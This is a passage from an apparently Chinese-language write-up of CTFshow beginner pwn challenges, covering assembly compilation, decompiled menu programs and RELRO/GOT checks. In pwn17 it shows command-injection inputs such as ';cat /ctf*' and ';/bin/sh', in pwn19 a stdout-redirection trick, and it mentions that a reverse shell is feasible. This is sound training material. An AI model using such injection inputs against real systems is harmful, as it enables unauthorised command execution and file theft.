output[BUFFER_SIZE * 9 + 12];</span><br><span class="line">    int offset = 0;</span><br><span class="line">    offset += sprintf(output + offset, <span class="string">&quot;ctfshow&#123;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) &gt; 0) &#123;</span><br><span class="line">        <span class="keyword">for</span> (size_t i = 0; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (int j = 7; j &gt;= 0; j--) &#123;</span><br><span class="line">                offset += sprintf(output + offset, <span class="string">&quot;%d&quot;</span>, (buffer[i] &gt;&gt; j) &amp; 1);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i != n - 1) &#123;</span><br><span class="line">                offset += sprintf(output + offset, <span class="string">&quot;_&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!feof(fp)) &#123;</span><br><span class="line">            offset += sprintf(output + offset, <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    offset += sprintf(output + offset, <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br></pre></td></tr></table></figure>

<p>程序打开名为 “key” 的文件，以二进制（”rb”）模式进行读取。如果文件打开失败，将输出错误消息 “Nothing here!” 并返回 -1</p>
<p>然后，程序定义了一个缓冲区 buffer 用于读取文件内容，以及一个字符串数组 output 用于存储转换后的二进制字符串。变量 offset 用于跟踪 output 数组中的偏移量。</p>
<p>接下来，程序开始将输出字符串初始化为 “ctfshow{“，然后进入一个循环，每次读取</p>
<p>BUFFER_SIZE 字节的数据到 buffer 中，并将其转换为二进制字符串形式。</p>
<p>在内层循环中，程序遍历当前读取的字节的每一位，从最高位到最低位。通过右移操作和位与运算，提取出每一位的值，并使用 sprintf 函数将其添加到 output 字符串中。</p>
<p>在每个字节的二进制表示结束后，如果当前字节不是最后一个字节，则在 output 字符串中添加下划线作为分隔符。</p>
<p>如果文件还未读取完毕（即文件结束符未被读取），则在 output 字符串中添加空格作为分隔符。</p>
<p>循环结束后，程序在 output 字符串中添加 “}”，表示结束标记，并使用 printf 函数将最终的转换结果打印出来。</p>
<p>最后，程序关闭文件，并返回 0 表示成功执行。</p>
<p>该程序的作用是将二进制文件中的内容转换为二进制字符串形式，并以特定格式输出</p>
<h2 id="pwn15"><a href="#pwn15" class="headerlink" title="pwn15"></a>pwn15</h2><p>Hint：编译汇编代码到可执行文件，即可拿到flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nasm -f elf flag.asm -o flag.o</span><br><span class="line">$ ld -m elf_i386 -o flag flag.o</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">flag  flag.asm  flag.o</span><br><span class="line">$ ./flag</span><br><span class="line">ctfshow&#123;@ss3mb1y_1s_3@sy&#125;</span><br></pre></td></tr></table></figure>

<h6 id="分析过程-1"><a href="#分析过程-1" class="headerlink" title="分析过程"></a>分析过程</h6><p>这段代码是一个使用 x86 汇编语言编写的程序，用于在标准输出上打印一串特定格式的字符串。</p>
<p>要将这段代码编译为可执行文件，使用汇编器和链接器进行以下步骤：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nasm -f elf flag.asm -o flag.o <span class="comment">#将汇编代码编译为目标文件</span></span><br><span class="line">$ ld -m elf_i386 -o flag flag.o <span class="comment">#将目标文件链接为可执行文件</span></span><br><span class="line">$ ./flag  <span class="comment">#运行此文件，执行后，它会在标准输出上打印出flag</span></span><br></pre></td></tr></table></figure>

<p><code>Tip:</code>原文件是Intel语法（NASM风格）,如果你是GAS汇编器，执行如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#原文件上添加</span><br><span class="line">.intel_syntax noprefix  # 声明使用 Intel 语法，且寄存器无需 % 前缀</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ as --32 -o output.o input.asm  <span class="comment"># 32 位汇编（根据需要调整架构）</span></span><br><span class="line">$ ld -m elf_i386 -o output output.o  <span class="comment"># 32 位链接</span></span><br></pre></td></tr></table></figure>

<h2 id="pwn16"><a href="#pwn16" class="headerlink" title="pwn16"></a>pwn16</h2><p>Hint：使用gcc将其编译为可执行文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc flag.s -o flag</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">flag  flag.s</span><br><span class="line">$ ./flag</span><br><span class="line">ctfshow&#123;daniuniuda&#125;</span><br></pre></td></tr></table></figure>

<h6 id="分析过程-2"><a href="#分析过程-2" class="headerlink" title="分析过程:"></a>分析过程:</h6><p>.s 文件是汇编语言源文件的一种常见扩展名。它包含了使用汇编语言编写的程序代码。汇编语言是一种低级编程语言，用于直接操作计算机的指令集架构。 .s 文件通常由汇编器（Assembler）处理，将其转换为可执行文件或目标文件。</p>
<p>可以使用 gcc 命令直接编译汇编语言源文件（ .s 文件）并将其链接为可执行文件。 gcc 命令具有适用于多种语言的编译器驱动程序功能，它可以根据输入文件的扩展名自动选择适当的编译器和链接器。</p>
<h2 id="pwn17"><a href="#pwn17" class="headerlink" title="pwn17"></a>pwn17</h2><p>Hint：有些命令好像有点不一样？</p>
<p>​        不要一直等，可能那样永远也等不到flag</p>
<p><code>题目考查点为Linux基础命令的拼接</code></p>
<p>在Linux命令中，分号（ ; ）用于分隔多个命令，允许在一行上顺序执行多个命令。</p>
<p>当使用分号（ ; ）将命令连接在一起时，它们按照从左到右的顺序逐个执行，无论前面的命令是否成功。这意味着无论前一个命令是否成功执行，后续的命令都将被执行。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">例如，考虑以下命令：</span><br><span class="line">command1 ; command2 ; command3 </span><br><span class="line">在这个例子中，command1 执行完毕后，无论成功与否，接着会执行 command2，然后再执行command3 。这样，多个命令可以按顺序在一行上执行。</span><br></pre></td></tr></table></figure>

<p>或者也可以使用 &amp; 将两条命令拼接在一起可以实现并行执行，即这两条命令将同时在后台执行。命令之间使用 &amp; 进行分隔。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">示例：</span><br><span class="line">command1 &amp; command2 </span><br><span class="line">1command1 和 command2 是两个要执行的命令。通过使用 &amp; 将它们连接起来，它们将同时在后台执行。这种方式下命令的输出可能会相互混合，具体的输出顺序取决于命令的执行速度和系统资源。</span><br></pre></td></tr></table></figure>

<p>回到题目：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">远程</span><br><span class="line">$ nc IP port</span><br><span class="line">2</span><br><span class="line">;<span class="built_in">cat</span> /ctf*</span><br></pre></td></tr></table></figure>

<h6 id="分析过程："><a href="#分析过程：" class="headerlink" title="分析过程："></a>分析过程：</h6><p>先checksec</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      Canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>64位保护全开</p>
<p>IDA查看main函数，找到关键部分：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nEnter the command you want choose:(1.2.3.4 or 5)\n&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Which directory?(&#x27;/&#x27;,&#x27;./&#x27; or the directiry you want?)&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0xAu</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(dest, buf);</span><br><span class="line">        system(dest);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Execution succeeded!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;$cat /ctfshow_flag&quot;</span>);</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ctfshow&#123;&quot;</span>);</span><br><span class="line">        sleep(<span class="number">2u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;... ...&quot;</span>);</span><br><span class="line">        sleep(<span class="number">3u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Your flag is ...&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ctfshow&#123;flag is not here!&#125;&quot;</span>);</span><br><span class="line">        sleep(<span class="number">0x14u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wtf?You haven&#x27;t left yet?\nOk~ give you flag:\nflag is loading......&quot;</span>);</span><br><span class="line">        sleep(<span class="number">0x1BF52u</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        sleep(<span class="number">2u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;su: Authentication failure&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;See you!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;command not found!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这段代码是一个无限循环的菜单程序，根据用户输入的选项执行相应的操作。具体逻辑如下：</p>
<ol>
<li><p>显示菜单选项。</p>
</li>
<li><p>提示用户输入要选择的命令（1、2、3、4或5）。</p>
</li>
<li><p>根据用户的选择执行相应的操作。</p>
<ul>
<li><p>如果选择为1，则执行系统命令 “id” 并输出结果。</p>
</li>
<li><p>如果选择为2，则要求用户输入目录，并将输入的目录添加到一个字符串中，然后执行该字符串作为系统命令。</p>
</li>
<li><p>如果选择为3，则以一定时间间隔逐行输出一段文字，最后执行系统命令 “cat &#x2F;ctfshow_flag” 并输出结果。</p>
</li>
<li><p>如果选择为4，则显示 “su: Authentication failure”。</p>
</li>
<li><p>如果选择为5，则显示 “See you!”，然后退出程序。</p>
</li>
<li><p>如果选择为其他值，则显示 “command not found!”。</p>
</li>
</ul>
</li>
<li><p>根据执行的结果，将相应的提示信息赋值给变量 v4。</p>
</li>
<li><p>根据执行的结果，输出相应的提示信息。</p>
</li>
</ol>
<p>可以看到在选项3最后会执行system(“cat &#x2F;ctfshow_flag”);命令，虽然最终能达到我们想要的效果，但是它sleep了很久很久，本地等的话没什么问题，但是远程环境并没有这么久，因此这条直接pass，其他1&#x2F;4&#x2F;5选项都没有实质性作用，但是2那里会有问题，我们可以进行拼接，限制了10字节</p>
<p>但是我们完全够用，可以构造出 “;cat &#x2F;ctf*” “;&#x2F;bin&#x2F;sh”等</p>
<p>直接拿取一个shell或者直接读出flag</p>
<p>在Linux中，通配符 * 表示匹配任意长度（包括零长度）的任意字符序列。</p>
<p>所以cat &#x2F;ctf*能够读到flag</p>
<h2 id="pwn18"><a href="#pwn18" class="headerlink" title="pwn18"></a>pwn18</h2><p>Hint：仔细看看源码，或许有惊喜</p>
<p>​	    假作真时真亦假，真作假时假亦真</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">远程</span><br><span class="line">$ nc IP port</span><br><span class="line">9</span><br></pre></td></tr></table></figure>

<h6 id="分析过程：-1"><a href="#分析过程：-1" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      Canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>64位保护全开</p>
<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> main&#123;</span><br><span class="line">    ...</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Which is the real flag?&quot;</span>);</span><br><span class="line">	__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n9);</span><br><span class="line">	<span class="keyword">if</span> ( n9 == <span class="number">9</span> )</span><br><span class="line">	  fake();</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	  real();</span><br><span class="line">	system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>打印提示消息：”Which is the real flag?”</li>
<li>使用 scanf 函数接收用户的输入，并将其保存在变量 v4 中。</li>
<li>如果用户输入的值等于 9，则调用 fake() 函数。</li>
<li>如果用户输入的值不等于 9，则调用 real() 函数。</li>
<li>无论用户输入的值是什么，都会执行 system(“cat &#x2F;ctfshow_flag”) 命令，将&#x2F;ctfshow_flag 文件的内容打印出来。</li>
</ol>
<p>分别跟进fake()和real():</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fake</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;flag is here&#x27;&gt;&gt;/ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">real</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;flag is here&#x27;&gt;/ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>system(“echo ‘flag is here’&gt;&gt;&#x2F;ctfshow_flag”);</p>
<p>这个命令将字符串 ‘flag is here’ 追加写入 &#x2F;ctfshow_flag 文件中。 &gt;&gt; 符号表示以追加的方式写入文件，如果文件不存在则创建新文件。如果 &#x2F;ctfshow_flag 文件已经存在，那么该命令会在文件的末尾添加 ‘flag is here’ 。</p>
</li>
<li><p>system(“echo ‘flag is here’&gt;&#x2F;ctfshow_flag”);</p>
<p>这个命令将字符串 ‘flag is here’ 覆盖写入 &#x2F;ctfshow_flag 文件中。 &gt; 符号表示以覆盖的方式写入文件，如果文件不存在则创建新文件。如果 &#x2F;ctfshow_flag 文件已经存在，那么该命令会将文件中原有的内容替换为 ‘flag is here’ 。</p>
</li>
</ol>
<p>这两个命令都用于将 ‘flag is here’ 写入 &#x2F;ctfshow_flag 文件中，不同之处在于写入方式的不同。第一个命令使用追加方式，在文件末尾添加内容；第二个命令使用覆盖方式，将文件内容替换为新内容。具体使用哪个命令取决于需求和文件操作的预期结果。也就是所假的其实是我们需要的真的，真的反而是假的</p>
<p>在远程环境中，我们需要在第一次读到flag，否则后续得到的flag都已经被覆写再追加，真实的flag内容已经没了。</p>
<h2 id="pwn19"><a href="#pwn19" class="headerlink" title="pwn19"></a>pwn19</h2><p>Hint：关闭了输出流，一定是最安全的吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ ./pwn</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Turn off output, how to get flag?</span><br><span class="line">    * *************************************</span><br><span class="line">give you a shell! now you need to get flag!</span><br><span class="line"><span class="built_in">exec</span> <span class="built_in">cat</span> /ctf* 1&gt;&amp;0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="分析过程：-2"><a href="#分析过程：-2" class="headerlink" title="分析过程："></a>分析过程：</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>64位保护全开</p>
<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( fork() )</span><br><span class="line">  &#123;</span><br><span class="line">    wait(<span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">3u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag is not here!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;give you a shell! now you need to get flag!&quot;</span>);</span><br><span class="line">    fclose(_bss_start);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20u</span>);</span><br><span class="line">    system(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<ol>
<li>if (fork()) : 这里使用 fork() 函数创建一个子进程。父进程中， fork() 返回子进程的进程ID，所以进入 if 语句块；子进程中， fork() 返回0，所以进入 else 语句块。</li>
</ol>
<p>在父进程中： 2.wait(0LL) : 父进程通过 wait() 函数等待子进程的结束，以确保子进程执行完</p>
<p>毕。</p>
<ol>
<li>sleep(3u) : 父进程睡眠3秒钟。</li>
<li>printf(“flag is not here!”) : 输出提示信息，表明flag不在此处。</li>
</ol>
<p>在子进程中： 2.puts(“give you a shell! now you need to get flag!”) : 输出提示信息，</p>
<p>表示给予用户一个shell，让其获取flag。</p>
<ol>
<li>fclose() : 关闭文件输出流。</li>
<li>read(0, &amp;buf, 0x20uLL) : 从标准输入中读取用户输入的命令，并存储在 buf 中。</li>
<li>system(&amp;buf) : 执行用户输入的命令。</li>
</ol>
<p>我们可以使用了<code>exec 函数来执行 sh 命令</code>，并使用<code>1&gt;&amp;0 来进行输出重定向</code>。这个命令将标准输出重定向到标准输入，实际上就是<code>将命令的输出发送到后续命令的输入</code></p>
<p>具体来说， <code>1&gt;&amp;0 中的 1 表示标准输出， 0 表示标准输入</code>。通过将标准输出重定向到标准输入，可以实现将命令的输出作为后续命令的输入。这样可以在执行 sh 命令后，进入一个交互式的Shell环境，可以在该环境中执行命令并与用户进行交互。</p>
<p>也可以直接<code>exec cat /ctf* 1&gt;&amp;0 将 cat /ctf* 命令的输出发送到标准输入</code>，实际上就是<code>将命令的输出再次输出到屏幕上</code>。</p>
<p>这里限制了20个字节，反弹shell的话理论上也可行，感兴趣的可以自行去尝试。</p>
<h2 id="pwn20"><a href="#pwn20" class="headerlink" title="pwn20"></a>pwn20</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Hint:提交ctfshow&#123;【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】&#125;</span><br><span class="line">	例如 .got可写.got.plt表可写其地址为0x400820 0x8208820</span><br><span class="line">	最终flag为ctfshow&#123;1_1_0x400820_0x8208820&#125;</span><br><span class="line">	若某个表不存在，则无需写其对应地址</span><br><span class="line">	如不存在.got.plt表，则最终flag值为ctfshow&#123;1_0_0x400820&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ ./pwn 0x600f18</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : What is RELRO protection ?</span><br><span class="line">    * *************************************</span><br><span class="line">RELRO: 52454c52</span><br><span class="line">$ ./pwn 0x600f28</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : What is RELRO protection ?</span><br><span class="line">    * *************************************</span><br><span class="line">RELRO: 52454c52</span><br></pre></td></tr></table></figure>

<p>程序正常执行，.got表和.got.plt都可写</p>
<p>故flag:ctfshow{1_1_0x600f18_0x600f28}</p>
<h6 id="分析过程：-3"><a href="#分析过程：-3" class="headerlink" title="分析过程："></a>分析过程：</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>可以看到仅开启了NX保护，RELRO保护是完全关闭状态</p>
<p>这里先看一下RELRO保护：</p>
<p>RELRO（RELocation Read-Only）是一种可选的二进制保护机制，用于增加程序的安全性。它主要通过限制和保护全局偏移表（Global Offset Table，简称 GOT）和过程链接表（Procedure Linkage Table，简称 PLT）的可写性来防止针对这些结构的攻击。RELRO保护有三种状态：</p>
<ol>
<li><p>No RELRO：在这种状态下，GOT和PLT都是可写的，意味着攻击者可以修改这些表中的指针，从而进行攻击。这是最弱的保护状态。</p>
</li>
<li><p>Partial RELRO：在这种状态下，GOT的开头部分被设置为只读（RO），而剩余部分仍然可写。这样可以防止一些简单的攻击，但仍存在一些漏洞。</p>
</li>
<li><p>Full RELRO：在这种状态下，GOT和PLT都被设置为只读（RO）。这样做可以防止对这些结构的修改，提供更强的保护。任何对这些表的修改都会导致程序异常终止。</p>
</li>
</ol>
<p>了解到上述内容后，这个保护的几题都游刃而解了</p>
<p>IDA查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.got:0000000000600F18 ; Segment type: Pure data</span><br><span class="line">.got:0000000000600F18 ; Segment permissions: Read/Write</span><br><span class="line">.got:0000000000600F18 _got            segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.got:0000000000600F18                 assume cs:_got</span><br><span class="line">.got:0000000000600F18                 ;org 600F18h</span><br><span class="line">.got:0000000000600F18 __libc_start_main_ptr dq offset __libc_start_main</span><br><span class="line">.got:0000000000600F18                                         ; DATA XREF: _start+24↑r</span><br><span class="line">.got:0000000000600F20 __gmon_start___ptr dq offset __gmon_start__</span><br><span class="line">.got:0000000000600F20                                         ; DATA XREF: _init_proc+4↑r</span><br><span class="line">.got:0000000000600F20 _got            ends</span><br><span class="line">.got:0000000000600F20</span><br><span class="line">.got.plt:0000000000600F28 ; ===========================================================================</span><br><span class="line">.got.plt:0000000000600F28</span><br><span class="line">.got.plt:0000000000600F28 ; Segment type: Pure data</span><br><span class="line">.got.plt:0000000000600F28 ; Segment permissions: Read/Write</span><br><span class="line">.got.plt:0000000000600F28 _got_plt        segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.got.plt:0000000000600F28                 assume cs:_got_plt</span><br><span class="line">.got.plt:0000000000600F28                 ;org 600F28h</span><br><span class="line">.got.plt:0000000000600F28 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span><br><span class="line">.got.plt:0000000000600F30 qword_600F30    dq 0                    ; DATA XREF: sub_400420↑r</span><br><span class="line">.got.plt:0000000000600F38 qword_600F38    dq 0                    ; DATA XREF: sub_400420+6↑r</span><br><span class="line">.got.plt:0000000000600F40 off_600F40      dq offset puts          ; DATA XREF: _puts↑r</span><br><span class="line">.got.plt:0000000000600F48 off_600F48      dq offset printf        ; DATA XREF: _printf↑r</span><br><span class="line">.got.plt:0000000000600F50 off_600F50      dq offset strtol        ; DATA XREF: _strtol↑r</span><br><span class="line">.got.plt:0000000000600F50 _got_plt        ends</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ objdump -R pwn</span><br><span class="line"></span><br><span class="line">pwn:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line">0000000000600f18 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5</span><br><span class="line">0000000000600f20 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line">0000000000600f40 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5</span><br><span class="line">0000000000600f48 R_X86_64_JUMP_SLOT  <span class="built_in">printf</span>@GLIBC_2.2.5</span><br><span class="line">0000000000600f50 R_X86_64_JUMP_SLOT  strtol@GLIBC_2.2.5</span><br></pre></td></tr></table></figure>

<p>查看一下表项地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ readelf -S pwn</span><br><span class="line">There are 29 section headers, starting at offset 0x1878:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .interp           PROGBITS         0000000000400200  00000200</span><br><span class="line">       000000000000001c  0000000000000000   A       0     0     1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE             000000000040021c  0000021c</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     4</span><br><span class="line">  [ 3] .note.gnu.bu[...] NOTE             000000000040023c  0000023c</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH         0000000000400260  00000260</span><br><span class="line">       000000000000001c  0000000000000000   A       5     0     8</span><br><span class="line">  [ 5] .dynsym           DYNSYM           0000000000400280  00000280</span><br><span class="line">       0000000000000090  0000000000000018   A       6     1     8</span><br><span class="line">  [ 6] .dynstr           STRTAB           0000000000400310  00000310</span><br><span class="line">       000000000000004b  0000000000000000   A       0     0     1</span><br><span class="line">  [ 7] .gnu.version      VERSYM           000000000040035c  0000035c</span><br><span class="line">       000000000000000c  0000000000000002   A       5     0     2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED          0000000000400368  00000368</span><br><span class="line">       0000000000000020  0000000000000000   A       6     1     8</span><br><span class="line">  [ 9] .rela.dyn         RELA             0000000000400388  00000388</span><br><span class="line">       0000000000000030  0000000000000018   A       5     0     8</span><br><span class="line">  [10] .rela.plt         RELA             00000000004003b8  000003b8</span><br><span class="line">       0000000000000048  0000000000000018  AI       5    22     8</span><br><span class="line">  [11] .init             PROGBITS         0000000000400400  00000400</span><br><span class="line">       0000000000000017  0000000000000000  AX       0     0     4</span><br><span class="line">  [12] .plt              PROGBITS         0000000000400420  00000420</span><br><span class="line">       0000000000000040  0000000000000010  AX       0     0     16</span><br><span class="line">  [13] .text             PROGBITS         0000000000400460  00000460</span><br><span class="line">       0000000000000252  0000000000000000  AX       0     0     16</span><br><span class="line">  [14] .fini             PROGBITS         00000000004006b4  000006b4</span><br><span class="line">       0000000000000009  0000000000000000  AX       0     0     4</span><br><span class="line">  [15] .rodata           PROGBITS         00000000004006c0  000006c0</span><br><span class="line">       000000000000053a  0000000000000000   A       0     0     8</span><br><span class="line">  [16] .eh_frame_hdr     PROGBITS         0000000000400bfc  00000bfc</span><br><span class="line">       000000000000003c  0000000000000000   A       0     0     4</span><br><span class="line">  [17] .eh_frame         PROGBITS         0000000000400c38  00000c38</span><br><span class="line">       0000000000000100  0000000000000000   A       0     0     8</span><br><span class="line">  [18] .init_array       INIT_ARRAY       0000000000600d38  00000d38</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [19] .fini_array       FINI_ARRAY       0000000000600d40  00000d40</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [20] .dynamic          DYNAMIC          0000000000600d48  00000d48</span><br><span class="line">       00000000000001d0  0000000000000010  WA       6     0     8</span><br><span class="line">  [21] .got              PROGBITS         0000000000600f18  00000f18</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .got.plt          PROGBITS         0000000000600f28  00000f28</span><br><span class="line">       0000000000000030  0000000000000008  WA       0    